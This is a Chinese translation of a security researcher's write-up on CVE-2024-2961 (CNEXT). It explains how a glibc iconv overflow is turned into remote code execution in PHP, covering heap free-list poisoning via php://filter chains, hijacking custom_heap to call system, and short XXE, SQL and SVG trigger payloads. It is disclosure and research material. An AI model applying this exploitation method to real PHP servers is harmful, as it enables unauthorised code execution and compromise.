<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#define NUL_TERMINATOR_LENGTH 4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">outbuf_size = len + NUL_TERMINATOR_LENGTH;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">outbytes_remaining = outbuf_size - NUL_TERMINATOR_LENGTH;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">outp = dest = g_malloc (outbuf_size);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">err = g_iconv (converter, NULL, &amp;inbytes_remaining, &amp;outp, &amp;outbytes_remaining);</span><br></span></code></pre></div></div>
<p>虽然它分配了 N + 4 字节的缓冲区，但它只告诉 iconv 关于 N 个字节。我们的溢出最多有 3 个字节长。因此，无论我们多么努力，我们都无法到达缓冲区之外。</p>
<p>另一个死胡同。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="条件和基元已更新">条件和基元（已更新）<a href="#条件和基元已更新" class="hash-link" aria-label="Direct link to 条件和基元（已更新）" title="Direct link to 条件和基元（已更新）" translate="no">​</a></h4>
<p>满怀失望，我只能更新我的要求清单。要利用此漏洞，我们需要：</p>
<ul>
<li>控制输出字符集 （ <code>ISO-2022-CN-EXT</code> ）</li>
<li>输入缓冲器的控制部分</li>
<li><strong>具有合适的输出缓冲器</strong></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="利用php过滤器">利用PHP过滤器<a href="#利用php过滤器" class="hash-link" aria-label="Direct link to 利用PHP过滤器" title="Direct link to 利用PHP过滤器" translate="no">​</a></h2>
<p>即使找了几天，我也没有找到一个有效的目标。盲目地在库和二进制文件中寻找 <code>iconv()</code> 调用，浏览开源生态系统，寻找该错误的可触发实例，我拼命寻找崩溃。一。崩溃。无济于事。</p>
<p>为了重新燃起希望，我又回到了PHP：毕竟，它确实崩溃了，我甚至没有要求它。</p>
<p>目标很简单：将无聊的文件读取漏洞转换为远程代码执行。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="php堆的入门">PHP堆的入门<a href="#php堆的入门" class="hash-link" aria-label="Direct link to PHP堆的入门" title="Direct link to PHP堆的入门" translate="no">​</a></h3>
<p><em>注意：在本节中，以及在描述PHP内部结构的每个部分中，我将进行近似值并忽略某些内容。</em></p>
<p>为了达到这个目的，我们需要了解PHP堆是如何工作的（至少是其中的一部分）。别担心，这是一个非常简单的堆。</p>
<p>要使用 PHP 进行分配，请使用 ，将 与 N 一起使用 <code>emalloc(N)</code> 所需的字节数。您将返回指向至少可以存储 N 个字节的块（内存块）的指针。完成块后，使用 <code>efree(ptr)</code> .PHP 有各种大小的块（8、0x10、0x18、...0x200,0x280，......</p>
<p>PHP 堆由一个 2MB 的区域组成，分为 512 页，每页 0x1000 字节。每个页面可能包含特定大小的块。例如，第 10 页可能包含大小为 0x100 的块、第 11 页大小为 0x38 的块、第 12 页大小为 0x180 的块等。块之间没有元数据。</p>
<p>当您释放一个块时，它会被放在一个称为释放列表的单向链表的开头。每个块大小都有一个免费列表。例如，如果我要释放大小为 0x38 块，它将进入大小为 0x38 块的可用列表中。如果我释放了一大块大小0x200，它就会进入大块0x200的免费列表中......</p>
<p>为了分配 N 个字节，PHP 会查看可用列表中的相应块大小，取出磁头并返回它。如果可用列表为空（即所有可用的块都已分配），PHP 会查看堆元数据以查找未使用的页面。然后，它会在这样的页面中创建空块，并将它们放在空闲列表中。</p>
<p>免费列表是后进先出，这意味着当我释放一定大小的块时，它将成为免费列表的头部。当我分配时，头部被取出。这与 glibc 的 tcache 非常相似，但不受限制。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.wjlin0.com/img/202501241112562.png-.png" alt="img" class="img_ev3q"><em>PHP 堆的可视化表示</em></p>
<p>在上面的示例中，我们在左侧有一个堆的可视化表示。它包含 512 页，此处第 5 页存储了大小为 0x400 的块。如果我们看一下这个页面的内容，我们可以看到它包含 4 个块（因为 4 × 0x400 = 0x1000，一个页面的大小）。在这里，分配了块 #1 和 #3，并释放了块 #2 和 #4。因此，它们在大小为 0x400 块的免费列表中。</p>
<p>空闲列表是一个单链表，每个未分配的块都包含指向下一个空闲块的指针作为其前 8 个字节。这就是我们在块 #2 中看到的：指向 0x7ff10201400 的指针，这是大小为 0x400 的下一个空闲块的地址。现在，如果我们要从块 #1 溢出到块 #2，我们将覆盖此指针。这是一个很好的漏洞利用起点：即使有一个字节的溢出，我们也可以更改一个空闲列表指针，从而改变空闲列表。</p>
<p>应该注意的是，PHP为每个HTTP请求创建一个新堆。这是使远程 PHP 开发变得困难的原因之一——但这将在第 2 部分中介绍。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="php-过滤器内部">PHP 过滤器内部<a href="#php-过滤器内部" class="hash-link" aria-label="Direct link to PHP 过滤器内部" title="Direct link to PHP 过滤器内部" translate="no">​</a></h3>
<p>现在我们知道了 PHP 是如何分配和取消分配的，我们可以看看 PHP 如何处理 <code>php://filter/</code> 字符串。我们很幸运：我们不需要深入了解内部 PHP 结构的细节，例如 <code>zval</code> 、 <code>zend_string</code> 、 <code>zend_array</code> 等。</p>
<p>为了处理过滤器，PHP 将首先获取流（即读取资源）。它将流存储在存储桶的集合中，这些存储桶是双链接结构，每个存储桶都包含一定大小的缓冲区。按照我们的 <code>/etc/passwd</code> 示例，我们可能有 3 个存储桶：第一个存储桶可能包含文件的前 5 个字节，第二个存储桶包含 30 多个字节，第三个存储桶包含 1000 个字节。它们联系在一起，构成了一个水桶旅。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.wjlin0.com/img/202501241112563.png-.png" alt="img" class="img_ev3q"><em>一个由 3 个铲斗组成的铲斗大队，其中包含 <code>/etc/passwd</code></em></p>
<p>这是将流表示为各种大小的缓冲区集合的标准方法。您可以将其想象为通过网络接收的数据包列表。数据包 1 包含前 N 个字节的数据，数据包 2 包含接下来的 M 个字节，依此类推。</p>
<p>现在，PHP 已经将资源的内容读入流中，由存储桶旅表示，它可以对其应用过滤器。它采用第一个筛选器，并处理第一个存储桶。为此，它会分配一个与存储桶缓冲区大小相同的输出缓冲区（在我们的示例中为 5 个字节），并进行转换。例如，如果筛选器是 <code>string.upper</code> ，它会将输入缓冲区中的每个小写字符转换为输出缓冲区中的大写字符。然后，它可以创建一个指向此缓冲区的新存储桶。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.wjlin0.com/img/202501241112564.png-.png" alt="img" class="img_ev3q"><em>申请 <code>string.upper</code> 水桶大队</em></p>
<p>然后，它处理存储桶 2，然后处理存储桶 3，依此类推，直到到达最后一个存储桶。现在，它有一个包含每个输出桶的新铲斗旅。它现在可以将第二个过滤器应用到这个旅上，并继续前进，直到处理完最后一个过滤器。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="情况和目标">情况和目标<a href="#情况和目标" class="hash-link" aria-label="Direct link to 情况和目标" title="Direct link to 情况和目标" translate="no">​</a></h3>
<p>我们已经完成了定义。让我们回到我们最初的漏洞：文件读取。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo file_get_contents($_GET[&#x27;file&#x27;]);</span><br></span></code></pre></div></div>
<p>现在，我们可以使用 <code>convert.iconv.XXX.ISO-2022-CN-EXT</code> 过滤器触发内存损坏，我们需要远程执行代码。而且它看起来并不难利用。</p>
<p>首先，由于我们有一个文件读取原语，我们可以读取二进制文件（PHP、Apache 等）。我们甚至可以下载libc并检查它是否已修补！我们也不关心 ASLR 和 PIE：我们可以阅读 <code>/proc/self/maps</code> .最后，感觉我们几乎可以使用存储桶任意分配或解除分配缓冲区，这很方便。</p>
<p>另一方面，在许多情况下，你可以让文件读取原语：你可能在运行在 PHP 7.0 上的 Symfony 4.x 上，或者在 PHP 8.3 上运行的晦涩的 Wordpress 插件中，甚至在黑盒评估期间。理想的漏洞利用需要具有弹性：它必须针对大多数目标，无需任何调整。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="开发">开发<a href="#开发" class="hash-link" aria-label="Direct link to 开发" title="Direct link to 开发" translate="no">​</a></h3>
<p>考虑到所有这些，让我们开始开发。这个想法是使用单字节缓冲区溢出来修改指向可用块的指针的 LSB，以便控制一些可用列表。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="单桶">单桶<a href="#单桶" class="hash-link" aria-label="Direct link to 单桶" title="Direct link to 单桶" translate="no">​</a></h4>
<p>我们面临的第一个问题是，尽管有 bucket brigade 技术，但 PHP 只创建一个 bucket。如果您读取一个文件，您将获得一个包含整个文件的存储桶。如果您请求 HTTP URL，PHP 将创建一个包含整个 HTTP 响应的存储桶。和 <code>ftp://</code> ，一个桶。至少可以说，这是非常不切实际的：我们不能使用水桶来填充堆，喷洒东西，甚至使用更改后的免费列表。</p>
<p>想一想：使用单个存储桶，我们可以溢出到一个空闲区块中并修改一个空闲列表，但是我们没有了存储桶，我们至少需要 2 个分配才能使用我们更改的空闲列表！</p>
<p>幸运的是，有一种过滤器可以挽救这一天： <code>zlib.inflate</code> .这个过滤器会获取我们的流并对其进行解压缩。为此，它分配了一个 8 页（0x8000 字节）的缓冲区，并将我们的流膨胀到其中。如果它不够大，它会创建一个相同大小的新缓冲区来存储其余数据。如果这两者仍然不够，它会创建另一个缓冲区。然后将每个缓冲区添加到存储桶中。完美：我们可以使用这个过滤器来创建任意数量的存储桶，这是向前迈出的一大步。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.wjlin0.com/img/202501241112565.png-.png" alt="img" class="img_ev3q"></p>
<p><em>申请 <code>zlib.inflate</code> 创建多个存储桶</em></p>
<p>但是，这些存储桶具有大小为 0x8000 的缓冲区，这不是一个很好的利用大小;缓冲 这些大小的分配方式与我告诉你的方式不同，并且在释放时不会进入可用列表。我们需要调整存储桶的大小。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="正确拆解">正确拆解<a href="#正确拆解" class="hash-link" aria-label="Direct link to 正确拆解" title="Direct link to 正确拆解" translate="no">​</a></h4>
<p>为此，我们将使用一个 PHP 未记录但攻击者所熟知的过滤器： <code>dechunk</code> .此筛选器解码 HTTP 分块编码的字符串。</p>
<p>HTTP-chunked 是一种非常简单的编码，您可以在其中按块（不是堆块，数据块）发送数据。首先，发送一个大小为 ASCII-hex，后跟一个换行符，然后是相应大小的数据块，后跟一个换行符。然后，发送另一个大小、另一个块、另一个大小、另一个块，并通过发送大小 0（零）来指示数据的结束。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.wjlin0.com/img/202501241112566.png-.png" alt="img" class="img_ev3q"></p>
<p><em>使用 HTTP 分块编码编码的数据</em></p>
<p>在此示例中，第一个块长 8 个字节，第二个块长 17 个字节 （11h)，最后一个块长 13 个字节。在 ing 之后 <code>dechunk</code> ，结果将是： <code>This is how the chunked encoding works</code> 。</p>
<p>使用此过滤器，调整存储桶的大小听起来像是儿戏：在每个存储桶中，我们以所需的大小为数据添加前缀（例如，第一个存储桶为 0x148，第二个存储桶为 0x100 等），然后放置数据，然后最后一个 0 表示我们完成了。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.wjlin0.com/img/202501241112567.png-.png" alt="img" class="img_ev3q"></p>
<p>设置存储 <code>dechunk</code> 桶*</p>
<p>它看起来不错，但它不起作用。虽然是单独处理的，但存储桶不是独立的：它们都被解析为一个大流。 <code>dechunk</code> 当筛选器处理流时，它会读取第一个存储桶 0x148 中的大小，取出 0x148 个字节，然后读取大小为零，这会导致它停止解析。它不会进入第二个桶。它只是完全停止解析。我们操作的最终结果是，我们从几个桶（好）回到了一个桶（坏)。</p>
<p>幸运的是，找到一种方法来规避这一点并不难：在每个存储桶中，我们提供一种大小和一个数据块。为此，我们不是天真地写一个大小，而是用数千个零填充它，以便得到这样的东西：</p>
<p><img decoding="async" loading="lazy" src="https://cdn.wjlin0.com/img/202501241112568.png-.png" alt="img" class="img_ev3q"></p>
<p><em>正确设置存储 <code>dechunk</code> 桶</em></p>
<p>现在，在处理存储桶 1 后，dehunk 解析器跳转到存储桶 2，准备读取新大小，然后跳转到存储桶 3，依此类推。它有效！现在，我们可以创建任意数量的存储桶，并具有所需的大小。我们已经取得了巨大的飞跃。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="免费列表控制写什么就写什么">免费列表控制：写什么就写什么<a href="#免费列表控制写什么就写什么" class="hash-link" aria-label="Direct link to 免费列表控制：写什么就写什么" title="Direct link to 免费列表控制：写什么就写什么" translate="no">​</a></h4>
<p>我们现在的目标是通过覆盖值为 48h（ <code>H</code> 在 ASCII 中）的某个指针的 LSB 来更改一些空闲列表。为了无条件地获得相同的效果，我们以大小为 0x100 的块为目标，因为块地址的 LSB 始终为零。这意味着溢出的效果始终相同：将0x48添加到块指针。</p>
<p>为了利用，我们遵循一个非常标准的 6 个步骤。我们将大小为 0x100 块的免费列表命名为 <code>FL[0x100]</code> 。</p>
<p><img decoding="async" loading="lazy" src="https://cdn.wjlin0.com/img/202501241112569.png-.png" alt="img" class="img_ev3q">* <code>FL[0x100]</code> 控制 <code>FL[0x100]</code>*</p>
<p>考虑到我们已经设法通过分配大量0x100块来填充堆。因此，在内存的某个地方，我们有三个连续的自由块 <code>A</code> 、 <code>B</code> 和 <code>C</code> ， <code>A</code> 并且是 的 <code>FL[100]</code> 。 <code>A</code> 指向 <code>B</code> ，而 指向 <code>C</code> 。我们可以分配其中的 3 个（第 2 步），然后再次释放它们（第 3 步）。在这一点上，免费列表是相反的：我们有 <code>C</code> → <code>B</code> → <code>A</code> 。然后我们再次分配，但这次我们在偏移 <code>48h</code> 量处 <code>C</code> 放置一个任意指针 <code>0x1122334455</code> （步骤 4）。我们再次释放它们（步骤 5），并获得与步骤 1 完全相同的状态，但这次略有不同：在 <code>C+48h</code> ，我们有一个任意指针。我们现在可以从 块 <code>A</code> 执行溢出，这会移动包含在 中的 <code>B</code> 指针。它现在指向 <code>C+48h</code> ，因此，免费列表现在 <code>B</code> <code>C+48h</code> →→ <code>0x1122334455</code> 。再分配 3 个，我们可以在任意地址进行 PHP 分配。</p>
<p>我们现在有一个写什么的地方;这快结束了。</p>
<p>但是，让我回到漏洞利用的实现上来。在这里描述的各个步骤中，我们有分配然后释放的块。但是我们无法真正摆脱水桶：我们只能改变它们的大小。但是，我们只对大小0x100块感兴趣。就好像其他块不存在一样。因此，我将每个存储桶构建为一个 HTTP 分块的俄罗斯娃娃：</p>
<p><img decoding="async" loading="lazy" src="https://cdn.wjlin0.com/img/202501241112570.png-.png" alt="img" class="img_ev3q">
一个水桶的俄罗斯娃娃：它的大小在每个 <code>dechunk</code> 桶上都变化*</p>
<p>对于漏洞利用的每个步骤， <code>dechunk</code> 都会调用过滤器：因此，每个存储桶的大小都会发生变化。有些尺寸变0x100，从而在剥削中“出现”，有些变小，从而消失。它为我们提供了一种完美的方式，让水桶在特定时刻实现，并在我们不再需要它们时将它们扔掉。</p>
<p>说完这些，让我们开始执行代码。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="代码执行">代码执行<a href="#代码执行" class="hash-link" aria-label="Direct link to 代码执行" title="Direct link to 代码执行" translate="no">​</a></h4>
<p>虽然我们通过阅读 <code>/proc/self/maps</code> 来查看内存区域，但我们并不确切地知道我们在堆中的位置。幸运的是，我们可以通过找到PHP的堆来完全忽略这个问题。由于其对齐方式 （~0x1fffff） 和大小 （2MB），它很容易识别。在它的顶部驻留着一个 <code>zend_mm_heap</code> 结构，其中包含非常有用的字段：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">struct _zend_mm_heap {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    int                use_custom_heap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    zend_mm_free_slot *free_slot[ZEND_MM_BINS]; /* free lists for small sizes */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    union {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        struct {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            void      *(*_malloc)(size_t);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            void       (*_free)(void*);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            void      *(*_realloc)(void*, size_t);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } std;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    } custom_heap;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">};</span><br></span></code></pre></div></div>
<p>首先，它包含所有免费列表。通过覆盖空闲列表，我们得到了任意数量的任意大小的写入内容。我们可以用它们来覆盖最后一个字段 <code>custom_heap</code> ，该字段包含 <code>emalloc()</code> 和 <code>efree()</code> 的 <code>erealloc()</code> 替代函数（类似于 glibc 中的 <code>__malloc_hook</code> 及其同级函数）。然后，我们设置为 <code>use_custom_heap</code> <code>1</code> ，并调用 <code>free()</code> 一个存储桶，为我们提供一个带有受控参数的任意函数调用。由于我们可以使用文件读取访问二进制文件，因此我们可以构建花哨的 ROP 链，但我们想要尽可能通用的东西;因此，我设置为 <code>custom_heap._free</code> <code>system</code> ，允许我们以 CTF 方式运行任意 bash 命令。</p>
<p><em>注意：我遗漏了一些（许多）关于漏洞利用的细节，但对漏洞进行了大量评论。</em></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="利用性能">利用性能<a href="#利用性能" class="hash-link" aria-label="Direct link to 利用性能" title="Direct link to 利用性能" translate="no">​</a></h4>
<p>我们的漏洞利用运行了 3 个请求：它下载 <code>/proc/self/maps</code> ，并提取 PHP 堆的地址和 libc 的文件名。然后，它下载 libc 二进制文件以提取 的 <code>system()</code> 地址。最后，它执行执行溢出的最终请求并执行我们的任意命令。</p>
<p>它的表现非常好：</p>
<ul>
<li>适用于任何目标<!-- -->
<ul>
<li>From PHP 7.0.0 (2015) to 8.3.7 (2024)
从 PHP 7.0.0 （2015） 到 8.3.7 （2024）</li>
<li>Any PHP application: Wordpress, Laravel, etc.
任何PHP应用程序：Wordpress，Laravel等。</li>
</ul>
</li>
<li>它是100%可靠的<!-- -->
<ul>
<li>Due to its implementation, it will never (?) produce a crash
由于它的实现，它永远不会（？）产生崩溃</li>
<li>A binary exploit that feels like a web exploit!
感觉像网络漏洞的二进制漏洞！</li>
</ul>
</li>
<li>有效负载小于 1000 字节<!-- -->
<ul>
<li>通过使用 <code>zlib.inflate</code> 和仅 12 个过滤器，有效载荷非常小</li>
<li>它适合 GET 请求</li>
</ul>
</li>
<li>自包含漏洞利用<!-- -->
<ul>
<li>无需以 GET 或 POST 的形式发送其他参数：漏洞利用会自行完成所有操作，从填充堆到设置可用列表，最后执行代码</li>
</ul>
</li>
</ul>
<p>它是一个小于 1000 字节的单个有效负载，可远程执行 10 年的 PHP 版本代码。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="演示">演示<a href="#演示" class="hash-link" aria-label="Direct link to 演示" title="Direct link to 演示" translate="no">​</a></h4>
<p>为了说明这一点，我将以运行在 PHP 8.3.x 上的 Wordpress 实例为目标。为了引入文件读取漏洞，我添加了 BuddyForms 插件 （v2.7.7），该插件存在<a href="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8" target="_blank" rel="noopener noreferrer">CVE-2023-26326</a>的缺陷。该错误最初被报告为 PHAR 反序列化错误，但 Wordpress 没有任何反序列化小工具链。在任何情况下，目标都运行在 PHP 8+ 上，因此它不容易受到 PHAR 攻击。</p>
<p><em>注意：如果您阅读<a href="/en/docs/个人知识库/CTF/奇技淫巧/(https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8)">原始查找器</a>的公告，您可能会看到，在文件读取基元之前，会执行调用 <code>getimagesize()</code> 以检查文件是否为图像。因此，为了允许漏洞和 libc 读取 <code>/proc/self/maps</code> ，我使用<a href="https://www.ambionics.io/blog/wrapwrap-php-filters-suffix" target="_blank" rel="noopener noreferrer">wrapwrap</a> 使它们看起来像 GIF 图像。</em></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="冲击">冲击<a href="#冲击" class="hash-link" aria-label="Direct link to 冲击" title="Direct link to 冲击" translate="no">​</a></h2>
<p>对PHP生态有什么影响？这不是一个新的漏洞，而是漏洞的新利用向量。但是，有多种方法可以使 PHP 读取文件;文件读取原语在 Web 应用程序中非常流行。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="标准水槽">标准水槽<a href="#标准水槽" class="hash-link" aria-label="Direct link to 标准水槽" title="Direct link to 标准水槽" translate="no">​</a></h3>
<p>显然，PHP 的每个标准文件读取接收器都会受到影响： <code>file_get_contents()</code> 、、 <code>file()</code> 、 <code>readfile()</code> <code>fgets()</code> 、 <code>getimagesize()</code> <code>SplFileObject-&gt;read()</code> 等。文件写入也会受到影响（ <code>file_put_contents()</code> 及其同级）。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="使用漏洞">使用漏洞<a href="#使用漏洞" class="hash-link" aria-label="Direct link to 使用漏洞" title="Direct link to 使用漏洞" translate="no">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="sql-injection-to-rce-sql-注入到-rce">SQL injection to RCE SQL 注入到 RCE<a href="#sql-injection-to-rce-sql-注入到-rce" class="hash-link" aria-label="Direct link to SQL injection to RCE SQL 注入到 RCE" title="Direct link to SQL injection to RCE SQL 注入到 RCE" translate="no">​</a></h4>
<p>如果您在 PDO/MySQL 上获得 SQL 注入，您也许可以使用 <code>LOAD DATA LOCAL INFILE</code> ：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">LOAD DATA LOCAL INFILE &#x27;php://filter/cnext...&#x27;;</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="xxe">XXE<a href="#xxe" class="hash-link" aria-label="Direct link to XXE" title="Direct link to XXE" translate="no">​</a></h4>
<p>XXE 现在是 RCE。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;!DOCTYPE root [</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;!ENTITY exploit SYSTEM &quot;php://filter/cnext...&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">]&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;root&gt;&amp;exploit;&lt;/root&gt;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="作为-phar-的替代品">作为 PHAR 的替代品<a href="#作为-phar-的替代品" class="hash-link" aria-label="Direct link to 作为 PHAR 的替代品" title="Direct link to 作为 PHAR 的替代品" translate="no">​</a></h3>
<p>与 PHAR 攻击相反，仅对文件（如 <code>file_exists()</code> 或 <code>is_file()</code> ）执行检查的函数不受影响。但是，在其他情况下，该漏洞可以用作 PHAR 攻击的替代品，如演示中所示。禁用 <code>phar://</code> 或更新到 PHP 8 不会拯救您。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="解析库">解析库<a href="#解析库" class="hash-link" aria-label="Direct link to 解析库" title="Direct link to 解析库" translate="no">​</a></h3>
<p>每个以某种方式操纵 URL 的库都可能容易受到攻击。以下是我在开发漏洞时发现的一些新目标：</p>
<ul>
<li><a href="https://packagist.org/packages/meyfa/php-svg" target="_blank" rel="noopener noreferrer">meyfa/php-svg</a>: 最流行的 SVG 操作库</li>
<li><a href="https://packagist.org/packages/symfony/translation" target="_blank" rel="noopener noreferrer">symfony/translation</a>: XLIFF 解析器易受攻击</li>
</ul>
<p>例如，PHP-SVG 库可能会受到这样的有效载荷的攻击：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;svg width=&quot;100&quot; height=&quot;100&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &lt;image href=&quot;php://filter/cnext/...&quot; width=&quot;1&quot; height=&quot;1&quot; /&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/svg&gt;</span><br></span></code></pre></div></div>
<p>HTML 到 PDF 解析器（如 dompdf、tcpdf 等）也可能是目标。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="类实例化">类实例化<a href="#类实例化" class="hash-link" aria-label="Direct link to 类实例化" title="Direct link to 类实例化" translate="no">​</a></h3>
<p>有时，在攻击PHP时，会遇到以下原语：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">new $_GET[&#x27;cls&#x27;]($_GET[&#x27;argument&#x27;]);</span><br></span></code></pre></div></div>
<p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/" target="_blank" rel="noopener noreferrer">This excellent blogpost from PTswarm</a> describes many ways to get a file read from this primitive, which may all be used to trigger the exploit. Examples include <code>SoapClient</code>, <code>Imagick</code>, <code>tidy</code>, or <code>SimpleXMLElement</code>.
这篇来自 <a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/" target="_blank" rel="noopener noreferrer">PTswarm</a> 的优秀博文描述了从这个原语中读取文件的多种方法，这些方法都可能用于触发漏洞利用。示例包括 <code>SoapClient</code> 、 <code>Imagick</code> 、 <code>tidy</code> 或 <code>SimpleXMLElement</code> 。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="作为对小工具链的改进">作为对小工具链的改进<a href="#作为对小工具链的改进" class="hash-link" aria-label="Direct link to 作为对小工具链的改进" title="Direct link to 作为对小工具链的改进" translate="no">​</a></h3>
<p>如果您发现文件读取 <code>unserialize()</code> 小工具链，则可以使用该漏洞将其升级到 RCE。随着最近的应用程序以及 PHP 库越来越多地使用类型这一事实，它可能会派上用场。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="其他人可能">其他人，可能<a href="#其他人可能" class="hash-link" aria-label="Direct link to 其他人，可能" title="Direct link to 其他人，可能" translate="no">​</a></h3>
<p>只要您控制文件读取或文件写入接收器的前缀，您就拥有了 RCE！</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="时间线">时间线<a href="#时间线" class="hash-link" aria-label="Direct link to 时间线" title="Direct link to 时间线" translate="no">​</a></h2>
<ul>
<li>去年 Crash 发现</li>
<li>2月 开始处理错误</li>
<li>3 月 26 日 Bug 报告给 glibc 安全团队</li>
<li>4 月 4 日 Bug 报告给 linux 发行版</li>
<li>4 月 17 日漏洞作为 CVE-2024-2961 发布</li>
</ul>
<p>注意：glibc 安全团队速度快、彬彬有礼且技术能力强。他们在一周内发布了一个补丁（以及随之而来的所有补丁）。非常感谢！*</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="结论">结论<a href="#结论" class="hash-link" aria-label="Direct link to 结论" title="Direct link to 结论" translate="no">​</a></h2>
<p><strong>CNEXT (CVE-2024-2961)</strong> 系列文章的第一部分到此结束 。该漏洞现已在我们的 <a href="https://github.com/ambionics/cnext-exploits/" target="_blank" rel="noopener noreferrer">GitHub</a> 上提供。还有很多东西需要探索：直接调用呢 <code>iconv()</code> ？如果读取的文件是盲文件，会发生什么情况？</p>
